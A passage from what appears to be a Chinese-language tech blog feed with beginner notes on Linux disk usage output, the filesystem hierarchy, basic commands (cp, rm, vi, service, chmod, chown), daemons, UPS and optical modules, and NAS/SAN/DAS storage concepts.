class="line">92</span><br></pre></td><td class="code"><pre><span class="line">root@kylin-vmwarevirtualplatform:~# df -h</span><br><span class="line">文件系统        容量  已用  可用 已用% 挂载点</span><br><span class="line">udev            1.9G     0  1.9G    0% /dev</span><br><span class="line">tmpfs           391M  3.0M  388M    1% /run</span><br><span class="line">/dev/sda5        17G  9.5G  6.4G   60% /</span><br><span class="line">tmpfs           2.0G  4.0K  2.0G    1% /dev/shm</span><br><span class="line">tmpfs           5.0M  4.0K  5.0M    1% /run/lock</span><br><span class="line">tmpfs           2.0G     0  2.0G    0% /sys/fs/cgroup</span><br><span class="line">/dev/sda1       976M  117M  792M   13% /boot</span><br><span class="line">/dev/sda7        12G  3.8G  6.8G   36% /data</span><br><span class="line">tmpfs           391M   40K  391M    1% /run/user/1000</span><br><span class="line"></span><br><span class="line">root@kylin-vmwarevirtualplatform:~# df -T</span><br><span class="line">文件系统       类型        1K-块    已用    可用 已用% 挂载点</span><br><span class="line">udev           devtmpfs  1963924       0 1963924    0% /dev</span><br><span class="line">tmpfs          tmpfs      399856    2992  396864    1% /run</span><br><span class="line">/dev/sda5      ext4     17468240 9891312 6666544   60% /</span><br><span class="line">tmpfs          tmpfs     1999260       4 1999256    1% /dev/shm</span><br><span class="line">tmpfs          tmpfs        5120       4    5116    1% /run/lock</span><br><span class="line">tmpfs          tmpfs     1999260       0 1999260    0% /sys/fs/cgroup</span><br><span class="line">/dev/sda1      ext4       999320  119532  810976   13% /boot</span><br><span class="line">/dev/sda7      ext4     11668656 3931000 7125204   36% /data</span><br><span class="line">tmpfs          tmpfs      399852      40  399812    1% /run/user/1000</span><br><span class="line"></span><br><span class="line">root@kylin-vmwarevirtualplatform:~# df -hT</span><br><span class="line">文件系统       类型      容量  已用  可用 已用% 挂载点</span><br><span class="line">udev           devtmpfs  1.9G     0  1.9G    0% /dev</span><br><span class="line">tmpfs          tmpfs     391M  3.0M  388M    1% /run</span><br><span class="line">/dev/sda5      ext4       17G  9.5G  6.4G   60% /</span><br><span class="line">tmpfs          tmpfs     2.0G  4.0K  2.0G    1% /dev/shm</span><br><span class="line">tmpfs          tmpfs     5.0M  4.0K  5.0M    1% /run/lock</span><br><span class="line">tmpfs          tmpfs     2.0G     0  2.0G    0% /sys/fs/cgroup</span><br><span class="line">/dev/sda1      ext4      976M  117M  792M   13% /boot</span><br><span class="line">/dev/sda7      ext4       12G  3.8G  6.8G   36% /data</span><br><span class="line">tmpfs          tmpfs     391M   40K  391M    1% /run/user/1000</span><br><span class="line"></span><br><span class="line">root@kylin-vmwarevirtualplatform:~# df -a</span><br><span class="line">文件系统          1K-块    已用    可用 已用% 挂载点</span><br><span class="line">sysfs                 0       0       0     - /sys</span><br><span class="line">proc                  0       0       0     - /proc</span><br><span class="line">udev            1963924       0 1963924    0% /dev</span><br><span class="line">devpts                0       0       0     - /dev/pts</span><br><span class="line">tmpfs            399856    2992  396864    1% /run</span><br><span class="line">/dev/sda5      17468240 9891312 6666544   60% /</span><br><span class="line">none                  0       0       0     - /sys/kernel/security</span><br><span class="line">tmpfs           1999260       4 1999256    1% /dev/shm</span><br><span class="line">tmpfs              5120       4    5116    1% /run/lock</span><br><span class="line">tmpfs           1999260       0 1999260    0% /sys/fs/cgroup</span><br><span class="line">cgroup2               0       0       0     - /sys/fs/cgroup/unified</span><br><span class="line">cgroup                0       0       0     - /sys/fs/cgroup/systemd</span><br><span class="line">pstore                0       0       0     - /sys/fs/pstore</span><br><span class="line">none                  0       0       0     - /sys/fs/bpf</span><br><span class="line">cgroup                0       0       0     - /sys/fs/cgroup/perf_event</span><br><span class="line">cgroup                0       0       0     - /sys/fs/cgroup/blkio</span><br><span class="line">cgroup                0       0       0     - /sys/fs/cgroup/freezer</span><br><span class="line">cgroup                0       0       0     - /sys/fs/cgroup/rdma</span><br><span class="line">cgroup                0       0       0     - /sys/fs/cgroup/hugetlb</span><br><span class="line">cgroup                0       0       0     - /sys/fs/cgroup/cpu,cpuacct</span><br><span class="line">cgroup                0       0       0     - /sys/fs/cgroup/pids</span><br><span class="line">cgroup                0       0       0     - /sys/fs/cgroup/cpuset</span><br><span class="line">cgroup                0       0       0     - /sys/fs/cgroup/net_cls,net_prio</span><br><span class="line">cgroup                0       0       0     - /sys/fs/cgroup/devices</span><br><span class="line">cgroup                0       0       0     - /sys/fs/cgroup/memory</span><br><span class="line">systemd-1             -       -       -     - /proc/sys/fs/binfmt_misc</span><br><span class="line">hugetlbfs             0       0       0     - /dev/hugepages</span><br><span class="line">debugfs               0       0       0     - /sys/kernel/debug</span><br><span class="line">mqueue                0       0       0     - /dev/mqueue</span><br><span class="line">tracefs               0       0       0     - /sys/kernel/tracing</span><br><span class="line">configfs              0       0       0     - /sys/kernel/config</span><br><span class="line">fusectl               0       0       0     - /sys/fs/fuse/connections</span><br><span class="line">vmware-vmblock        0       0       0     - /run/vmblock-fuse</span><br><span class="line">/dev/sda1        999320  119532  810976   13% /boot</span><br><span class="line">/dev/sda7      11668656 3931000 7125204   36% /data</span><br><span class="line">/dev/sda7      11668656 3931000 7125204   36% /root</span><br><span class="line">/dev/sda7      11668656 3931000 7125204   36% /home</span><br><span class="line">tmpfs            399852      40  399812    1% /run/user/1000</span><br><span class="line">gvfsd-fuse            0       0       0     - /run/user/1000/gvfs</span><br><span class="line">binfmt_misc           0       0       0     - /proc/sys/fs/binfmt_misc</span><br><span class="line">root@kylin-vmwarevirtualplatform:~#</span><br><span class="line"></span><br><span class="line">root@kylin-vmwarevirtualplatform:~# df -i</span><br><span class="line">文件系统         Inode 已用(I) 可用(I) 已用(I)% 挂载点</span><br><span class="line">udev            490981     496  490485       1% /dev</span><br><span class="line">tmpfs           499815    1008  498807       1% /run</span><br><span class="line">/dev/sda5      1117920  218325  899595      20% /</span><br><span class="line">tmpfs           499815       2  499813       1% /dev/shm</span><br><span class="line">tmpfs           499815       5  499810       1% /run/lock</span><br><span class="line">tmpfs           499815      18  499797       1% /sys/fs/cgroup</span><br><span class="line">/dev/sda1        65536     354   65182       1% /boot</span><br><span class="line">/dev/sda7       745472     426  745046       1% /data</span><br><span class="line">tmpfs           499815      50  499765       1% /run/user/1000</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>Linux文件系统采用了一种<strong>树形结构</strong>的层次组织方式，从根目录（/）开始，通过目录的嵌套关系形成一个层次结构。下面是Linux文件系统树形结构的一些重要目录：</p><ol><li><p>根目录（/）：根目录是整个文件系统的起点，所有其他目录和文件都是从根目录开始的。根目录是文件系统的顶级目录，它没有父目录。</p></li><li><p>/bin：这个目录包含了一些基本的可执行文件，如常用的命令（如ls、cp、mv等）和系统工具。</p></li><li><p>/sbin：这个目录包含了一些系统级的可执行文件，通常只有管理员才能运行的命令。</p></li><li><p>/etc：这个目录包含了系统的配置文件，如网络配置、用户账户配置、服务配置等。</p></li><li><p>/home：这个目录是用户的主目录，每个用户都有一个以其用户名命名的子目录，在这个目录下存放用户的个人文件和配置。</p></li><li><p>/lib：这个目录包含了一些共享的库文件，这些库文件被系统和应用程序使用。</p></li><li><p>/dev：这个目录包含了设备文件，用于与系统中的设备进行交互。</p></li><li><p>/mnt：这个目录是用于临时挂载其他文件系统的目录。当需要将其他存储设备挂载到系统中时，可以将其挂载到/mnt目录下。</p></li><li><p>/opt：这个目录用于安装可选软件包，通常由第三方软件提供商使用。</p></li><li><p>/tmp：这个目录用于存放临时文件，系统和应用程序可以在这个目录下创建临时文件。</p></li><li><p>/usr：这个目录包含了用户程序和文件，如系统命令、应用程序、库文件、文档等。</p></li><li><p>/var：这个目录包含了一些可变的文件，如日志文件、数据库文件、缓存文件等。</p></li></ol><p>这只是Linux文件系统树形结构中的一些重要目录，实际上还有很多其他目录和子目录。每个目录都可以包含其他目录和文件，形成了一个层次结构，方便组织和管理文件和目录。</p><p>通过这种树形结构，Linux文件系统可以非常灵活地组织和管理文件和目录，使得用户可以方便地访问和操作文件系统中的数据。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>learn</title>
      <link href="/2023/12/07/learn/"/>
      <url>/2023/12/07/learn/</url>
      
        <content type="html"><![CDATA[<h2 id="HDM管理口"><a href="#HDM管理口" class="headerlink" title="HDM管理口"></a>HDM管理口</h2><p>HDM管理口通常是一个特定的物理接口，用于连接HDM设备与管理控制台或网络管理系统。通过管理口，管理员可以进行设备的配置、监控和故障排除等管理操作。</p><p>通过HDM管理口，管理员可以通过管理工具或命令行界面（CLI）等方式对HDM设备进行配置、监控和故障排除。这样可以更方便地管理大规模网络环境中的设备，并及时响应和解决问题，提高网络的可靠性和可管理性。</p><h2 id="光模块"><a href="#光模块" class="headerlink" title="光模块"></a>光模块</h2><p>光模块（Optical Module）是一种<strong>用于光纤通信</strong>的设备，它<strong>将电信号转换为光信号，实现光纤之间的数据传输</strong>。</p><p>光模块通常由光发射器（光源）和光接收器（光探测器）组成，它们可以分别将电信号转换为光信号和将光信号转换为电信号。光模块还包括一些其他组件，如光耦合器、驱动电路、接收电路、温度控制器等，以确保光信号的稳定传输和接收。</p><p>光模块具有以下特点：</p><ol><li><p>标准化接口：光模块通常采用标准化的接口，如SFP（Small Form-factor Pluggable）、SFP+、QSFP（Quad Small Form-factor Pluggable）等。这些接口可以与光纤设备（如交换机、路由器）相连接，实现光纤之间的数据传输。</p></li><li><p>传输距离和速率：光模块可以支持不同的传输距离和速率。传输距离可以从几十米到几十公里不等，速率可以从几百Mbps到几百Gbps不等。根据不同的需求，可以选择适合的光模块进行数据传输。</p></li><li><p>光纤类型：光模块可以适配不同类型的光纤，如单模光纤（Single-mode Fiber）和多模光纤（Multi-mode Fiber）。不同类型的光纤具有不同的传输特性和传输距离，光模块需要与之匹配。</p></li><li><p>热插拔性：光模块通常支持热插拔，即可以在运行状态下插入或拔出。这样可以方便地更换或升级光模块，而无需停止整个系统的运行。</p></li></ol><p>光模块在光纤通信中扮演着重要的角色，它们被广泛应用于数据中心、电信运营商、企业网络等领域。通过使用光模块，可以实现高速、稳定和远距离的数据传输，满足不同应用场景的需求。</p><h2 id="UPS"><a href="#UPS" class="headerlink" title="UPS"></a>UPS</h2><p>UPS（Uninterruptible Power Supply）是一种用于提供电力备份和保护的设备。它可以<strong>在电源中断或电压异常时，提供持续的电力供应，以保证连接到其上的设备正常运行</strong>。</p><p>UPS通常由以下几个部分组成：</p><ol><li><p>蓄电池：UPS内部配备了一组蓄电池，用于存储电能。当电网供电正常时，蓄电池会通过充电器进行充电，以备用电源。</p></li><li><p>逆变器：UPS内部还有一个逆变器，它将蓄电池中的直流电能转换为交流电能，以供连接到UPS上的设备使用。</p></li><li><p>稳压器：UPS还配备了稳压器，用于调整电压的稳定性。当电网供电电压不稳定时，稳压器可以提供稳定的输出电压，以保护设备免受电压波动的影响。</p></li></ol><p>UPS的工作原理如下：</p><ol><li><p>正常供电：当电网供电正常时，UPS将电能传递给连接到其上的设备，同时通过充电器将电能存储到蓄电池中。</p></li><li><p>电网中断：当电网供电中断时，UPS会立即切换到蓄电池供电模式，通过逆变器将蓄电池中的直流电能转换为交流电能，以供设备使用。这样可以避免设备因为电源中断而停止工作。</p></li><li><p>电压异常：当电网供电电压异常（如过高或过低）时，UPS的稳压器会调整输出电压，以保持稳定的电压供应。这样可以防止设备受到电压波动的损害。</p></li></ol><p>UPS广泛应用于各种场景，特别是对于对电力供应要求高的设备和系统，如计算机数据中心、网络设备、医疗设备、通信设备等。通过使用UPS，可以提供可靠的电力备份和保护，保证设备的正常运行，并防止因为电源问题而导致的数据丢失或设备损坏。</p><h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><p>在Linux中，<code>cp</code>命令用于复制文件或目录。它的基本语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp [选项] 源文件 目标文件</span><br></pre></td></tr></table></figure><p>常见的选项包括：</p><ul><li><code>-r</code>或<code>-R</code>：递归复制，用于复制目录及其下所有文件和子目录。</li><li><code>-i</code>：交互式复制，如果目标文件已存在，则提示是否覆盖。</li></ul><p>以下是一些示例：</p><ol><li><p>复制一个文件到指定目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp file.txt /path/to/directory/</span><br></pre></td></tr></table></figure></li><li><p>复制多个文件到指定目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp file1.txt file2.txt /path/to/directory/</span><br></pre></td></tr></table></figure></li><li><p>复制目录及其下所有文件和子目录到指定目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r directory /path/to/directory/</span><br></pre></td></tr></table></figure></li><li><p>复制文件并重命名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp file.txt newfile.txt</span><br></pre></td></tr></table></figure></li><li><p>交互式复制，如果目标文件已存在，则提示是否覆盖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -i file.txt /path/to/directory/</span><br></pre></td></tr></table></figure></li></ol><p>需要注意的是，如果目标文件已经存在，使用<code>cp</code>命令会覆盖目标文件。如果要保留原始文件，可以使用<code>cp</code>命令前先备份文件。</p><h2 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h2><p>在Linux中，可以使用<code>rm</code>命令来删除文件。<code>rm</code>命令用于删除指定的文件或目录。</p><p>删除文件的基本语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm [选项] 文件名</span><br></pre></td></tr></table></figure><p>常见的选项包括：</p><ul><li><code>-f</code>：强制删除，不提示确认。</li><li><code>-i</code>：交互式删除，删除前提示确认。</li><li><code>-r</code>或<code>-R</code>：递归删除，用于删除目录及其下所有文件和子目录。</li></ul><p>以下是一些示例：</p><ol><li><p>删除一个文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm file.txt</span><br></pre></td></tr></table></figure></li><li><p>删除多个文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm file1.txt file2.txt file3.txt</span><br></pre></td></tr></table></figure></li><li><p>删除目录及其下所有文件和子目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -r directory</span><br></pre></td></tr></table></figure></li><li><p>强制删除文件，不提示确认：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f file.txt</span><br></pre></td></tr></table></figure></li></ol><p>需要注意的是，删除文件后是无法恢复的，请谨慎使用<code>rm</code>命令。如果要删除的文件是重要文件或者不确定是否需要删除，建议在执行删除操作之前先备份文件。</p><h2 id="vi"><a href="#vi" class="headerlink" title="vi"></a>vi</h2><p>Vi 是一种在 Linux 系统中常用的文本编辑器。它是一个命令行界面的编辑器，可以用于编辑各种类型的文件。</p><p>要使用 Vi 编辑器，可以在终端中输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi 文件名</span><br></pre></td></tr></table></figure><p>这将打开一个新的 Vi 编辑器窗口，并加载指定的文件。如果文件不存在，Vi 将创建一个新文件。</p><p>在 Vi 编辑器中，有三种主要的模式：命令模式、插入模式和底行模式。</p><ul><li><p>命令模式：当您打开 Vi 编辑器时，默认处于命令模式。在此模式下，您可以执行各种编辑操作，例如移动光标、删除文本、复制粘贴等。要进入命令模式，请按下 Esc 键。</p></li><li><p>插入模式：在命令模式下，按下 <code>i</code> 键可以进入插入模式。在插入模式下，您可以直接输入文本，并进行编辑。要退出插入模式并返回到命令模式，请按下 Esc 键。</p></li><li><p>底行模式：在命令模式下，按下冒号 <code>:</code> 键可以进入底行模式。在底行模式下，您可以执行一些底行命令，例如保存文件、退出编辑器等。在底行模式下，您可以输入命令，然后按下 Enter 键执行该命令。执行完命令后，会返回到命令模式。</p></li></ul><p>以下是一些常用的 Vi 编辑器命令：</p><ul><li>移动光标：h（左）、j（下）、k（上）、l（右）</li><li>删除文本：x（删除一个字符）、dd（删除整行）</li><li>复制粘贴：yy（复制整行）、p（粘贴）</li><li>保存文件：在底行模式下，输入 <code>:w</code> 并按下 Enter 键</li><li>退出编辑器：在底行模式下，输入 <code>:q</code> 并按下 Enter 键</li></ul><p>这只是 Vi 编辑器的一些基本操作，Vi 还有更多高级的功能和命令。如果您想深入了解 Vi 编辑器，请查阅相关的文档或教程。</p><h2 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h2><p>守护进程（daemon）是在计算机操作系统中以后台形式运行的一种特殊进程。守护进程通常在系统启动时启动，并在系统运行期间持续运行，不依赖于任何用户终端的存在。</p><p>守护进程的主要特点包括：</p><ol><li><p>后台运行：守护进程在后台运行，不与用户终端进行交互。它通常不会向终端输出信息，也不会接收来自终端的输入。</p></li><li><p>无用户终端依赖：守护进程不依赖于任何用户终端的存在。即使用户退出登录或关闭终端，守护进程仍然可以继续运行。</p></li><li><p>服务提供：守护进程通常用于提供某种服务，如网络服务、打印服务、日志服务等。它们监听特定的端口或文件，并根据请求提供相应的功能。</p></li><li><p>生命周期管理：守护进程的生命周期由操作系统管理。它们可以在系统启动时自动启动，并在系统关闭时自动停止。</p></li></ol><p>在 Linux 系统中，守护进程的名称通常以字母 “d” 结尾，如 <code>sshd</code>、<code>httpd</code>、<code>crond</code> 等。守护进程的具体实现和管理方式可能因操作系统而异，但通常可以通过服务管理工具（如 <code>systemd</code>、<code>init.d</code>）来管理和控制守护进程的启动、停止和重启。</p><p>守护进程在系统中发挥着重要的作用，它们提供了很多核心服务，使得系统能够在后台运行并提供各种功能。</p><h2 id="service"><a href="#service" class="headerlink" title="service"></a>service</h2><p><code>service</code> 命令是一个旧的系统服务管理工具，用于启动、停止和查看服务的状态。它通常在较旧的 Linux 发行版中使用。</p><p>以下是一些常用的 <code>service</code> 命令用法示例：</p><ul><li><p>启动服务：<code>service &lt;服务名称&gt; start</code><br>例如，启动 <code>apache2</code> 服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure></li><li><p>停止服务：<code>service &lt;服务名称&gt; stop</code><br>例如，停止 <code>nginx</code> 服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx stop</span><br></pre></td></tr></table></figure></li><li><p>重启服务：<code>service &lt;服务名称&gt; restart</code><br>例如，重启 <code>mysql</code> 服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysql restart</span><br></pre></td></tr></table></figure></li><li><p>查看服务状态：<code>service &lt;服务名称&gt; status</code><br>例如，查看 <code>ssh</code> 服务的状态：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service ssh status</span><br></pre></td></tr></table></figure></li><li><p>列出所有服务状态：<code>service --status-all</code><br>这会列出所有系统上的服务，并显示它们的状态。</p></li></ul><p>请注意，<code>service</code> 命令需要使用 <code>sudo</code> 或具有管理员权限的账户才能执行。在较新的 Linux 发行版中，推荐使用更现代的 <code>systemctl</code> 命令来管理服务。</p><p>使用 <code>service</code> 命令查看所有服务的状态可以执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service --status-all</span><br></pre></td></tr></table></figure><p>这会列出系统上所有的服务，并显示它们的状态。服务名称前带有 <code>[ + ]</code> 表示服务正在运行，<code>[ - ]</code> 表示服务已停止。在输出中，你还可以看到一些带有问号标记的服务，表示它们的状态无法确定。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">root@kylin-vmwarevirtualplatform:/home# service --status-all</span><br><span class="line"> [ - ]  acpid</span><br><span class="line"> [ - ]  alsa-utils</span><br><span class="line"> [ - ]  anacron</span><br><span class="line"> [ - ]  apparmor</span><br><span class="line"> [ + ]  atd</span><br><span class="line"> [ - ]  auditd</span><br><span class="line"> [ + ]  avahi-daemon</span><br><span class="line"> [ + ]  biometric-authentication</span><br><span class="line"> [ - ]  bluetooth</span><br><span class="line"> [ - ]  console-setup.sh</span><br><span class="line"> [ + ]  cpufrequtils</span><br><span class="line"> [ + ]  cron</span><br><span class="line"> [ - ]  cryptdisks</span><br><span class="line"> [ - ]  cryptdisks-early</span><br><span class="line"> [ + ]  cups</span><br><span class="line"> [ - ]  cups-browsed</span><br><span class="line"> [ + ]  dbus</span><br><span class="line"> [ + ]  dnsmasq</span><br><span class="line"> [ + ]  grub-common</span><br><span class="line"> [ - ]  hwclock.sh</span><br><span class="line"> [ + ]  ipsec</span><br><span class="line"> [ - ]  keyboard-setup.sh</span><br><span class="line"> [ + ]  kmod</span><br><span class="line"> [ + ]  lightdm</span><br><span class="line"> [ + ]  lm-sensors</span><br><span class="line"> [ + ]  loadcpufreq</span><br><span class="line"> [ - ]  lvm2</span><br><span class="line"> [ - ]  lvm2-lvmpolld</span><br><span class="line"> [ + ]  mysql</span><br><span class="line"> [ + ]  network-manager</span><br><span class="line"> [ + ]  networking</span><br><span class="line"> [ + ]  nmbd</span><br><span class="line"> [ + ]  open-vm-tools</span><br><span class="line"> [ - ]  plymouth</span><br><span class="line"> [ - ]  plymouth-log</span><br><span class="line"> [ - ]  pppd-dns</span><br><span class="line"> [ + ]  procps</span><br><span class="line"> [ - ]  pulseaudio-enable-autospawn</span><br><span class="line"> [ - ]  rsync</span><br><span class="line"> [ + ]  rsyslog</span><br><span class="line"> [ - ]  samba-ad-dc</span><br><span class="line"> [ - ]  saned</span><br><span class="line"> [ + ]  smartmontools</span><br><span class="line"> [ + ]  smbd</span><br><span class="line"> [ + ]  ssh</span><br><span class="line"> [ + ]  udev</span><br><span class="line"> [ + ]  ufw</span><br><span class="line"> [ - ]  uuidd</span><br><span class="line"> [ - ]  x11-common</span><br><span class="line"> [ + ]  xl2tpd</span><br><span class="line"> [ + ]  xrdp</span><br><span class="line"> [ + ]  yhkydefenderservice</span><br><span class="line">root@kylin-vmwarevirtualplatform:/home# service --status-all | grep mysql</span><br><span class="line"> [ + ]  mysql</span><br></pre></td></tr></table></figure><p>请注意，<code>service</code> 命令在较新的系统上可能已被 <code>systemctl</code> 取代，因此推荐使用 <code>systemctl</code> 命令进行服务管理，尤其是在较新的 Linux 发行版中。</p><h2 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h2><p><code>chmod</code> 是一个用于修改文件或目录权限的命令。它可以更改文件或目录的读、写和执行权限，以及文件或目录的所有者和所属组。</p><p><code>chmod</code> 命令的基本语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod [选项] 模式 文件/目录</span><br></pre></td></tr></table></figure><p>其中，选项可以是以下之一：</p><ul><li><code>-c</code>：显示每个修改过的文件的操作信息。</li><li><code>-f</code>：不显示错误信息。</li><li><code>-v</code>：显示每个修改过的文件的操作信息。</li><li><code>-R</code>：递归地修改目录及其子目录中的文件权限。</li></ul><p>模式可以是以下之一：</p><ul><li>数字形式的权限：例如 <code>755</code> 或 <code>644</code>。</li><li>符号形式的权限：例如 <code>u+rwx</code>、<code>g+rw</code>、<code>o-x</code>。</li></ul><p>文件/目录是要修改权限的文件或目录的路径。</p><p>以下是一些常用的示例：</p><ol><li><p>将文件 <code>file.txt</code> 的所有者设置为可读、可写和可执行，所属组和其他用户只有读的权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 744 file.txt</span><br></pre></td></tr></table></figure></li><li><p>将目录 <code>dir</code> 及其子目录中的所有文件设置为可读、可写和可执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R 755 dir</span><br></pre></td></tr></table></figure></li><li><p>将文件 <code>file.txt</code> 的所有者和所属组的执行权限移除：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod ug-x file.txt</span><br></pre></td></tr></table></figure></li></ol><p>请注意，<code>chmod</code> 命令需要使用 <code>sudo</code> 或管理员权限来执行对系统文件的修改。</p><h2 id="chown"><a href="#chown" class="headerlink" title="chown"></a>chown</h2><p><code>chown</code> 命令用于更改文件或目录的所有者和所属组。它可以将文件或目录的所有者和所属组修改为其他用户或组。</p><p><code>chown</code> 命令的基本语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown [选项] 用户[:组] 文件/目录</span><br></pre></td></tr></table></figure><p>其中，选项可以是以下之一：</p><ul><li><code>-c</code>：显示每个修改过的文件的操作信息。</li><li><code>-f</code>：不显示错误信息。</li><li><code>-v</code>：显示每个修改过的文件的操作信息。</li><li><code>-R</code>：递归地修改目录及其子目录中的文件所有者和所属组。</li></ul><p>用户可以是用户名或用户 ID，组可以是组名或组 ID。如果不指定组，则默认为用户的主组。文件/目录是要修改所有者和所属组的文件或目录的路径。</p><p>以下是一些常用的示例：</p><ol><li><p>将文件 <code>file.txt</code> 的所有者和所属组修改为用户 <code>user</code> 和组 <code>group</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown user:group file.txt</span><br></pre></td></tr></table></figure></li><li><p>将目录 <code>dir</code> 及其子目录中的所有文件的所有者和所属组修改为用户 <code>user</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R user dir</span><br></pre></td></tr></table></figure></li><li><p>将文件 <code>file.txt</code> 的所有者修改为用户 <code>user</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown user file.txt</span><br></pre></td></tr></table></figure></li></ol><p>请注意，<code>chown</code> 命令需要使用 <code>sudo</code> 或管理员权限来执行对系统文件的修改。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NAS、SAN、DAS</title>
      <link href="/2023/12/07/NAS%E3%80%81SAN%E3%80%81DAS/"/>
      <url>/2023/12/07/NAS%E3%80%81SAN%E3%80%81DAS/</url>
      
        <content type="html"><![CDATA[<h2 id="NAS"><a href="#NAS" class="headerlink" title="NAS"></a>NAS</h2><p>NAS（Network Attached Storage）是网络附加存储，也就是<strong>存储系统直接接入网络，通过网络交换机，将服务器与存储连接在一起</strong>，用户可以通过TCP/IP协议访问数据，并通过标准的业界文件共享协议，如CIFS、NFS来实现目录级的共享。</p><p>NAS设备是一种独立的存储设备，它具有自己的操作系统和文件系统，可以连接到网络中的其他设备，如计算机、服务器、智能手机等。它提供了一个中心化的存储解决方案，可以方便地共享和访问存储的数据。</p><h2 id="SAN"><a href="#SAN" class="headerlink" title="SAN"></a>SAN</h2><p>SAN（Storage Area Network）是存储区域网络，<strong>通过交换机将磁盘阵列等存储设备与相关服务器连接起来的高速专用存储网络</strong>。</p><p>SAN通过专用的网络连接存储设备（如磁盘阵列、磁带库等）和服务器，将存储资源独立于服务器提供。它提供了一个中心化的存储架构，可以通过高速的网络传输大量的数据，并提供快速、可靠的存储访问。</p><h2 id="DAS"><a href="#DAS" class="headerlink" title="DAS"></a>DAS</h2><p>DAS（Direct Attached Storage）是直连式存储，就是<strong>存储设备直接与主机服务器连接，其他主机不能使用这个存储设备</strong>。</p><p>DAS通过物理连接（如SATA、SAS、USB等）将存储设备（如硬盘驱动器、固态硬盘等）直接连接到服务器或计算机的存储控制器上。与NAS和SAN（他们两个都需要经过网络连接）不同，<strong>DAS不使用网络连接</strong>，而是通过直接连接实现存储资源的访问。</p><h2 id="三者差异"><a href="#三者差异" class="headerlink" 